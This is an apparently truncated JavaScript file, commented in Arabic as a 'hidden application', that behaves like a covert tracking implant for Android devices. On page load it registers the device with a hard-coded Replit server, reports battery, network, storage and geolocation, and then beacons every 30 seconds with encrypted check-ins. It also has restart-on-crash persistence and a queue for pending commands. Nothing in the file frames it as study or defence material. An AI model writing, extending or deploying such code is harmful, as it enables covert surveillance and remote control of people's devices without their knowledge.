// ============================================
// 🔧 إعدادات التطبيق المخفي
// ============================================

const SERVER_URL = 'https://624bf379-8f9d-4beb-8812-30e54011173d-00-2416evv3w9ocf.janeway.replit.dev';
const CHECK_IN_INTERVAL = 30000; // 30 ثانية
const HEARTBEAT_INTERVAL = 10000; // 10 ثواني
const MAX_RESTART_ATTEMPTS = 5;

let deviceId = localStorage.getItem('deviceId');
let encryptionKey = localStorage.getItem('encryptionKey');
let clientId = localStorage.getItem('clientId');
let restartAttempts = 0;
let isRunning = false;
let pendingCommands = [];

// ============================================
// 🚀 التشغيل التلقائي عند الإقلاع
// ============================================

document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 التطبيق المخفي بدأ (Boot/Restart)');
    initializeDevice();
    startHeartbeat();
    preventSleep();
});

// إعادة التشغيل إذا أُغلق
window.addEventListener('beforeunload', () => {
    console.log('⚠️ التطبيق يُغلق - سيتم إعادة التشغيل');
    localStorage.setItem('lastClose', Date.now().toString());
});

// التحقق من الإغلاق المفاجئ
function checkCrashRecovery() {
    const lastClose = localStorage.getItem('lastClose');
    if (lastClose) {
        const timeDiff = Date.now() - parseInt(lastClose);
        if (timeDiff < 5000) {
            console.log('⚠️ إغلاق مفاجئ detected');
        }
        localStorage.removeItem('lastClose');
    }
}

// ============================================
// 🔐 التهيئة التلقائية
// ============================================

async function initializeDevice() {    checkCrashRecovery();
    
    try {
        if (deviceId && encryptionKey && clientId) {
            console.log('✅ الجهاز مسجل مسبقاً');
            isRunning = true;
            startCheckInService();
            return;
        }
        
        console.log('🔄 تسجيل جديد (أول مرة أو بعد مسح البيانات)');
        
        clientId = 'client_' + Math.random().toString(36).substring(2, 15) + 
                   Math.random().toString(36).substring(2, 15);
        deviceId = 'device_' + Math.random().toString(36).substring(2, 15) + 
                   Math.random().toString(36).substring(2, 15);
        
        localStorage.setItem('clientId', clientId);
        localStorage.setItem('deviceId', deviceId);
        localStorage.setItem('installTime', Date.now().toString());
        
        await registerDevice();
        
    } catch (error) {
        console.error('❌ خطأ في التهيئة:', error);
        restartAttempts++;
        
        if (restartAttempts < MAX_RESTART_ATTEMPTS) {
            setTimeout(() => initializeDevice(), 10000 * restartAttempts);
        }
    }
}

// ============================================
// 📝 التسجيل لدى الخادم
// ============================================

async function registerDevice() {
    try {
        const deviceInfo = {
            deviceName: getDeviceName(),
            osType: 'Android',
            osVersion: navigator.userAgent,
            appVersion: '2.0.0',
            screenResolution: `${screen.width}x${screen.height}`,
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            registeredAt: new Date().toISOString()
        };
                const response = await fetch(`${SERVER_URL}/api/clients/register`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ clientId, deviceInfo })
        });
        
        const data = await response.json();
        
        if (data.success) {
            deviceId = data.deviceId;
            encryptionKey = data.encryptionKey;
            localStorage.setItem('deviceId', deviceId);
            localStorage.setItem('encryptionKey', encryptionKey);
            
            console.log('✅ تم التسجيل:', deviceId);
            isRunning = true;
            startCheckInService();
            await sendInitialInfo();
        } else {
            throw new Error(data.error || 'فشل التسجيل');
        }
    } catch (error) {
        console.error('❌ فشل التسجيل:', error);
        throw error;
    }
}

// ============================================
// 📊 إرسال المعلومات الأولية
// ============================================

async function sendInitialInfo() {
    try {
        const info = {
            deviceId: deviceId,
            type: 'initial_info',
            info: {
                battery: await getBatteryInfo(),
                network: await getNetworkInfo(),
                storage: await getStorageInfo(),
                location: await getLocationInfo()
            },
            timestamp: new Date().toISOString()
        };
        
        await fetch(`${SERVER_URL}/api/clients/report`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(info)
        });        
        console.log('📊 تم إرسال المعلومات الأولية');
    } catch (error) {
        console.error('❌ فشل إرسال المعلومات:', error);
    }
}

// ============================================
// 🔄 خدمة الاتصال الدوري (Check-in)
// ============================================

function startCheckInService() {
    console.log('🔄 بدء خدمة الاتصال الدوري (كل 30 ثانية)');
    
    setInterval(async () => {
        if (!isRunning) return;
        await checkIn();
    }, CHECK_IN_INTERVAL);
    
    // أول اتصال فوري
    checkIn();
}

async function checkIn() {
    try {
        const systemInfo = {
            deviceId: deviceId,
            status: 'active',
            battery: await getBatteryInfo(),
            network: await getNetworkInfo(),
            location: await getLocationInfo(),
            timestamp: new Date().toISOString()
        };
        
        const encryptedData = encryptData(systemInfo, encryptionKey);
        
        const response = await fetch(`${SERVER_URL}/api/clients/checkin`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({